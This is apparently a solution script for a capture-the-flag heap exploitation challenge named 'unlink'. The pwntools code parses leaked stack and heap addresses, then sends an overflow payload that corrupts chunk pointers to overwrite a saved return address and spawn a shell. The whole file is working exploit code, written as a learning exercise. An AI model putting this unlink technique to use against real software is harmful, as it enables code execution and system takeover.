from pwn import *
import re
import sys
import ctypes


#--------------------------------------------
#get a hex representation "12ab34cd" and return its correct twosComplement int val
def twosComplement_hex(hexval):
	bits = 32
	val = int(hexval, 16)
	if val & (1 << (bits-1)):
		val -= 1 << bits
	return val

#--------------------------------------------

STACK_OFFSET = 0x10
HEAP_OFFSET = 0xc

#--------------------------------------------

#context.log_level = 'debug'

conn = process('/home/unlink/unlink')

#--------get licks------------------------------------
#receive 2 lines:
#the first contains the stack address of *A which is located at ebp-0x14 (we write to this adr + 0x10)
#the second contains the heap address of A itself. (we write to this adr + 0xc)

#get first line
line = conn.recvline().decode()
print(line)

#calc correct int val of the adr according to twos complement and add the correct offset (we actualy dont use this in p32, only for printing)
stack_adr = twosComplement_hex(line[(line.index('0')+2):]) 

#stack_adr int value without two's complement:
#this is for p32: because stack addresses are very high value (0xff..) this results in a neg value in two's complement,
#which p32 doesnt support - so we get the int value that exceeds the memory limitations of int (2**31-1)
stack_adr_int = int(line[(line.index('0')+2):],16)

print("adr of *A on the stack as we got it from line: ",stack_adr, hex(stack_adr & (2**32-1)),"regular int non-2's complement value: ",stack_adr_int)

#add offeset to get the address of saved eip on the stack, which we want to overwrite
stack_adr += STACK_OFFSET
stack_adr_int += STACK_OFFSET
print("the adr of saved eip val on the stack want to overwrite: " ,hex(stack_adr & (2**32-1)), "regular int non-2's complement value: ",stack_adr_int)

#get second line
line = conn.recvline().decode()
print(line)

#calc correct int val of the adr according to twos complement and add the correct offset
heap_adr = twosComplement_hex(line[(line.index('0')+2):]) 
print("adr of A on the heap as we got it from line: ", hex(heap_adr & (2**32-1)))
#add offset this is the address A->buff
heap_adr += HEAP_OFFSET
print("adr of A->buff on the heap: ", hex(heap_adr & (2**32-1)))


#recieve another printed line: "now that you have leaks, get shell!"
conn.recvline()

#-------send payload--------------------------------------

#build payload: this payload is copied to A->buff using gets

p = p32(0x80484eb) #shell() address
p += "A"*4 #4 bytes to fill the rest of A->buff
p += "B"*8 #8 bytes to fill the header of chunck B
p += p32(heap_adr)  #overwrite: B->fd = *(A->buff+4)
p += p32(stack_adr_int) #overwrite: B->bk = *(ebp-0x4)

#send payload:
print("sending payload!")
conn.sendline(p)

#make conn interactive for the shell
conn.interactive()